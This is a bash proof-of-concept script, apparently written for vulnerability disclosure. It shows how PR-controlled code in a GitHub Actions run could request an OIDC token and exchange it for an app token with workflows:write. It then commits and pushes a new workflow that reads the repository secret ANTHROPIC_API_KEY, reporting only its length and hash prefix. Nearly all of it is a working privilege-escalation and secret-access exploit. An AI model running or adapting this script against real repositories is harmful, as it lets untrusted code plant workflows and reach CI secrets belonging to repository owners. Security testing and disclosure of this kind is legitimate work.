#!/bin/bash
# Benign PoC v3 (replica repo): can PR-controlled code mint a Claude App token with
# workflows:write and push a new workflow that runs with repository secrets?
# Secret and token values are never printed.
cd "${GITHUB_WORKSPACE:-$PWD}" 2>/dev/null
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action" | sed -nE 's/.*"value":"([^"]+)".*/\1/p')
RESP=$(curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" -d '{"permissions":{"contents":"write","workflows":"write","pull_requests":"write","issues":"write"}}' https://api.anthropic.com/api/github/github-app-token-exchange)
CODE=$(echo "$RESP" | tail -1)
TOK=$(echo "$RESP" | head -n -1 | sed -nE 's/.*"token":"([^"]+)".*/\1/p')
git checkout -q -b poc-escalation
mkdir -p .github/workflows
cat > .github/workflows/poc-escalation.yml <<'WF'
name: poc-escalation
on:
  push:
    branches: [poc-escalation]
permissions:
  contents: read
jobs:
  proof:
    runs-on: ubuntu-latest
    steps:
      - name: proof
        env:
          S: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          echo "PoC v3: attacker-pushed workflow executed on push"
          echo "repo secret ANTHROPIC_API_KEY readable: length=${#S} sha256prefix=$(printf %s "$S" | sha256sum | cut -c1-12)"
WF
{ echo "PoC v3"; echo "time: $(date -u)"; echo "exchange (workflows:write requested): HTTP $CODE, token type $(echo "$TOK" | cut -c1-4)***"; } > poc-proof3.txt
git add .github/workflows/poc-escalation.yml poc-proof3.txt
git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC v3: workflow pushed with self-minted token"
if ! git -c credential.helper= push -q "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/poc-escalation 2>/tmp/e; then
  git reset -q --soft HEAD~1; git rm -q --cached .github/workflows/poc-escalation.yml; rm -f .github/workflows/poc-escalation.yml
  echo "workflow push failed: $(head -c 300 /tmp/e | tr '\n' ' ' | sed -E 's#x-access-token:[^@]+@#x-access-token:***@#g')" >> poc-proof3.txt
  git add poc-proof3.txt; git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC v3 diag"
  git -c credential.helper= push -q "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/poc-v3-diag 2>/dev/null || git push -q origin HEAD:refs/heads/poc-v3-diag
fi
